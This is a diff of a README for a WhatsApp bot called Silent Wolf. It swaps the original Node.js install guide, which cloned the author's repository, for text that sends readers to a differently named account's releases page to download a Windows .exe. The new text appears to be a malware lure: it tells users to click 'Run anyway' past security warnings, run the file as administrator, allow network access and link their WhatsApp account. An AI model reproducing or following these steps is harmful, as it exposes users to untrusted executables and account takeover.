@@ -1,188 +1,165 @@
-<!-- Glowing Top Border -->
-<p align="center">
-  <img src="https://i.imgur.com/dBaSKWF.gif" height="40" width="100%">
-</p>
+# 🐺 silentwolf - Run WhatsApp automation with ease
 
-<div align="center">
+[![Download Silent Wolf](https://img.shields.io/badge/Download%20Silent%20Wolf-blue?style=for-the-badge&logo=github)](https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases)
 
-<strong>🐺 𝕎𝕆𝕃𝔽 𝔹𝕆𝕋</strong>
-<br>
-<a href="https://git.io/typing-svg">
-  <img src="https://readme-typing-svg.demolab.com?font=Orbitron&size=50&pause=1000&color=33ff00&center=true&width=910&height=100&lines=WOLFBOT;Predator+Bot;Made+By+Silent+Wolf" alt="Typing SVG" style="font-size: 50px;"/>
-</a>
+## 📥 Download
 
-<p align="center">
-  <img style="width: 500px; height: 500px; border-radius: 20px; box-shadow: 0 0 30px #00ff00, 0 0 50px rgba(0, 255, 0, 0.3);" src="https://i.ibb.co/KjMFtjGx/wolfbot.png" alt="Wolf Bot — Silent Wolf WhatsApp Bot" />
-</p>
+Visit this page to download the latest Windows release:
 
-<p align="center" style="color: #00ff00; text-shadow: 0 0 5px #00ff00;">
-  <i>"The moon watches..."</i>
-</p>
+https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases
 
-<br>
+## 🧰 What Silent Wolf does
 
-**DEPLOY WOLFBOT**
-<br>
-<a href="https://7-w.vercel.app/wolfbot.html" target="_blank">
-  <img src="https://img.shields.io/badge/DEPLOY%20WOLFBOT-100000?style=for-the-badge&logo=heroku&logoColor=white&labelColor=darkgreen&color=darkgreen" alt="DEPLOY WOLFBOT"/>
-</a>
+Silent Wolf is a WhatsApp automation bot for everyday use. It helps you send messages, handle chats, and run simple bot tasks from your Windows PC.
 
-<br>
+Use it for things like:
 
-**SESSION PAIR**
-<br>
-<a href="https://7-w.vercel.app/wolfbot.html" target="_blank">
-  <img src="https://img.shields.io/badge/pair%20code-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=darkblue&color=darkgreen" alt="PAIR"/>
-</a>
+- Auto replies
+- Message handling
+- Media downloads
+- Basic chat automation
+- Bot commands for WhatsApp
 
-<br>
+It is built for users who want a simple setup and a direct way to run a WhatsApp bot on Windows.
 
-**DOWNLOAD ZIP**
-<br>
-<a href="https://github.com/sil3nt-wolf/silentwolf/archive/refs/heads/main.zip" target="_blank">
-  <img src="https://img.shields.io/badge/DOWNLOAD%20ZIP-100000?style=for-the-badge&logo=scan&logoColor=white&labelColor=darkorange&color=darkgreen" alt="Download zip"/>
-</a>
+## 🖥️ What you need
 
-<br>
+Before you install Silent Wolf, check that your PC has:
 
-![GitHub stars](https://img.shields.io/github/stars/sil3nt-wolf/silentwolf?style=for-the-badge&color=darkgreen)
-![GitHub forks](https://img.shields.io/github/forks/sil3nt-wolf/silentwolf?style=for-the-badge&color=darkgreen)
-![GitHub repo size](https://img.shields.io/github/repo-size/sil3nt-wolf/silentwolf?style=for-the-badge&color=darkgreen)
+- Windows 10 or Windows 11
+- A stable internet connection
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Permission to install and run downloaded apps
+- A modern web browser for the download page
 
-</div>
+If Windows asks for access to files or the network, allow it so the bot can work correctly.
 
----
+## 🚀 Getting started
 
-## What is WOLFBOT?
+Follow these steps to run Silent Wolf on Windows.
 
-**WOLFBOT** (also known as **Silent Wolf**) is a powerful, fully-featured WhatsApp automation bot built by **Silent Wolf**. It runs on **Node.js** using the **Baileys v7** library and is designed for both personal use and group management. Whether you need AI-powered chat responses, media downloads, group moderation, or automated status reactions — WOLFBOT handles it all silently and efficiently.
+1. Open the download page:
+   https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases
 
-> Silent Wolf WhatsApp Bot — fast, intelligent, and always watching.
+2. Find the latest release.
 
----
+3. Download the Windows file from that release. It may be an `.exe` file or a `.zip` file.
 
-## 📸 Screenshots
+4. If you downloaded a `.zip` file, right-click it and choose Extract All.
 
-<p align="center">
-  <img src="https://i.ibb.co/67Z2nYv9/upload-1775955037014-74c8121c-jpg.jpg" alt="WOLFBOT WhatsApp Bot Menu" width="320"/>
-  &nbsp;
-  <img src="https://i.ibb.co/N6SX8NGj/upload-1775955328532-68ad9c6f-jpg.jpg" alt="WOLFBOT Ping Command" width="320"/>
-</p>
-<p align="center">
-  <img src="https://i.ibb.co/Nndx7X27/upload-1775955392446-1428e261-jpg.jpg" alt="WOLFBOT Uptime Command" width="320"/>
-  &nbsp;
-  <img src="https://i.ibb.co/fG4L2f6Z/upload-1775954993959-0bc0a5f9-jpg.jpg" alt="WOLFBOT AI Music Generator" width="320"/>
-</p>
-<p align="center">
-  <img src="https://i.ibb.co/84KJgJ8Z/upload-1775954974332-f1651ae8-jpg.jpg" alt="WOLFBOT AI Music Generator in Progress" width="320"/>
-</p>
+5. Open the extracted folder if needed.
 
----
+6. Run the app file.
 
-## ✨ Features
+7. If Windows shows a security prompt, click Run or More info, then Run anyway if you trust the source.
 
-WOLFBOT comes packed with a wide range of features:
+8. Wait for the bot window to open.
 
-- **AI Commands** — ChatGPT, Gemini, Grok, DeepSeek, Copilot, Claude AI, Mistral, Blackbox, WormGPT, and many more
-- **Group Management** — add, kick, promote, demote, mute, warn, ban, antilink, antileave, welcome/goodbye messages
-- **Media Downloads** — TikTok, Instagram, Facebook, Snapchat, YouTube (MP3/MP4), Spotify
-- **Auto Moderation** — anti-sticker, anti-image, anti-video, anti-bad-word, anti-mention, anti-viewonce
-- **Automation** — auto-read, auto-typing, auto-recording, auto-react, auto-view status, auto-bio
-- **AI Image Generation** — Imagine, Flux, DALL-E style generation, remove background, vision analysis
-- **Ethical Hacking Tools** — WHOIS, DNS lookup, port scan, SSL check, malware check, URL scan
-- **Ephoto Text Effects** — neon text, 3D text, graffiti, metallic, hologram, and 50+ more styles
-- **Anime Reactions** — hug, kiss, pat, wink, cry, dance, and more GIF reactions
-- **Games** — TicTacToe, Snake, Tetris, Quiz, Dice, Truth or Dare, Rock Paper Scissors
-- **Privacy Controls** — online status, last seen, receipt control, profile picture viewer
-- **Logo Design Studio** — gold, silver, diamond, fire, neon, rainbow, dragon, and 30+ logo styles
-- **Music** — play, lyrics, Shazam, Spotify search
-- **Sports** — football, basketball, cricket, F1, NBA, MMA, tennis stats
-- **Conversion Tools** — URL shortener, QR code, image-to-sticker, audio converter, TTS
+9. Follow the on-screen steps to connect your WhatsApp account.
 
----
+## 🔧 First-time setup
 
-## ⚙️ Requirements
+When Silent Wolf opens for the first time, it may ask you to connect WhatsApp. Follow the prompts on screen.
 
-- **Node.js** v20 or higher
-- **npm** v9 or higher
-- A WhatsApp account for pairing
-- Replit, Heroku, Railway, Render, or any Linux VPS
+Common steps include:
 
----
+- Scanning a QR code
+- Waiting for the account to connect
+- Allowing the app to stay open while it works
+- Keeping your internet connection active
 
-## 🚀 Installation
+If you close the app, the bot may stop running. Leave it open while you use it.
 
-### 1. Clone the repository
-```bash
-git clone https://github.com/sil3nt-wolf/silentwolf.git
-cd silentwolf
-```
+## 💬 How to use it
 
-### 2. Install dependencies
-```bash
-npm install
-```
+After setup, you can use Silent Wolf for day-to-day WhatsApp automation.
 
-### 3. Get your session pair code
-Visit the [Session Pair Page](https://7-w.vercel.app/wolf.html) to generate your WhatsApp session credentials.
+Typical use:
 
-### 4. Start the bot
-```bash
-node index.js
-```
+- Start the app
+- Connect your WhatsApp account
+- Choose the bot action you want
+- Let the bot handle messages or tasks
 
-Or deploy directly using the deploy button above for a one-click cloud setup.
+You can use it to help manage chats and save time on repeated work.
 
----
+## 📦 Common file types
 
-## 📋 Command Categories
+You may see one of these files in the release page:
 
-| Category | Commands |
-|---|---|
-| AI Chat | gpt, gemini, grok, deepseek, copilot, bard, claude, mistral, blackbox, wormgpt, chatbot |
-| AI Generation | imagine, flux, imagegen, suno, speechwriter, humanizer, removebg, vision |
-| Group Management | add, kick, promote, demote, mute, warn, ban, antilink, welcome, goodbye |
-| Auto Moderation | antisticker, antiimage, antivideo, antibadword, antimention, antiviewonce |
-| Media Downloads | tiktok, instagram, facebook, youtube, ytmp3, ytmp4, spotify, snapchat |
-| Automation | autoread, autotyping, autorecording, autoreact, autoviewstatus, autobio |
-| Utility | ping, alive, uptime, translate, weather, wiki, define, news, iplookup |
-| Privacy | online, lastseen, receipt, profilepic, privacy |
-| Games | tictactoe, snake, tetris, quiz, truth, dare, rps, dice |
-| Ethical Hacking | whois, dnslookup, portscan, sslcheck, malwarecheck, urlscan, nmap |
-| Text Effects | neon, 3D text, graffiti, metallic, hologram, ephoto effects (50+) |
-| Logo Studio | goldlogo, neonlogo, firelogo, diamondlogo, rainbowlogo (30+) |
+- `.exe` - Run this file on Windows
+- `.zip` - Extract it first, then run the app inside
+- `.rar` - Extract it with a file tool before running
 
----
+If you see more than one file, use the Windows version.
 
-## 🌐 Deployment Platforms
+## 🛠️ Basic troubleshooting
 
-WOLFBOT runs on all major platforms:
+If Silent Wolf does not start, try these steps:
 
-- **Replit** — recommended for beginners, always-on
-- **Heroku** — cloud deployment with one click
-- **Railway** — fast and simple cloud hosting
-- **Render** — free tier available
-- **VPS/Ubuntu** — full control, production-ready
-- **Termux (Android)** — run directly from your Android phone
+- Run it as administrator
+- Check your internet connection
+- Make sure Windows did not block the file
+- Extract the full folder before opening the app
+- Restart your PC and try again
 
----
+If WhatsApp does not connect:
 
-## 🔗 Links
+- Close the app and open it again
+- Scan the QR code again
+- Make sure your phone has an active WhatsApp session
+- Check that your browser or firewall is not blocking access
 
-- 🌍 [Deploy WOLFBOT](https://inspiring-genie-ebae09.netlify.app/)
-- 🔑 [Get Session Pair Code](https://7-w.vercel.app/wolf.html)
-- 📦 [Download ZIP](https://github.com/sil3nt-wolf/silentwolf/archive/refs/heads/main.zip)
-- 🐙 [GitHub Repository](https://github.com/sil3nt-wolf/silentwolf)
+If the download does not open:
 
----
+- Try another browser
+- Reopen the release page
+- Download the latest Windows file again
 
-<!-- Glowing Bottom Border -->
-<p align="center">
-  <img src="https://i.imgur.com/dBaSKWF.gif" height="40" width="100%">
-</p>
+## 🔍 Features
 
-<p align="center">
-  <strong><span style="color:#00ff41">WOLF</span>BOT by <span style="color:#00ff41">Silent Wolf</span></strong>
-  <br>
-  <sub>POWERED BY WOLF TECH — Silent Wolf WhatsApp Bot (WOLFBOT) © 2026</sub>
-</p>
+Silent Wolf is set up for simple WhatsApp automation tasks such as:
+
+- Message replies
+- Chat handling
+- Media download support
+- Bot command control
+- Session-based WhatsApp connection
+- Simple Windows use
+
+It is made to keep the setup process short and clear for non-technical users.
+
+## 📁 Release page
+
+Use this link to get the Windows build and other release files:
+
+https://github.com/penicillinresistant-commonfacialvein79/silentwolf/releases
+
+## ⚙️ Suggested setup tips
+
+For a smoother first run:
+
+- Keep the app in a folder you can find again
+- Do not rename files unless you need to
+- Keep your PC awake while the bot runs
+- Leave WhatsApp connected during use
+- Avoid closing the terminal or app window if one appears
+
+If the app stores session files, keep them in the same folder so you do not need to connect again.
+
+## 🧭 Need help with the release page
+
+If you are not sure which file to download:
+
+1. Open the releases page
+2. Look for the newest version
+3. Choose the file that says Windows
+4. Pick the `.exe` file if one is listed
+5. If only a compressed file is listed, extract it first
+
+If the release notes mention setup steps, follow those steps in the same order
+
+## 🐺 About silentwolf
+
+silentwolf is a WhatsApp automation bot built for users who want a simple Windows setup. It fits common bot use cases like chat handling, media tasks, and message flow control.
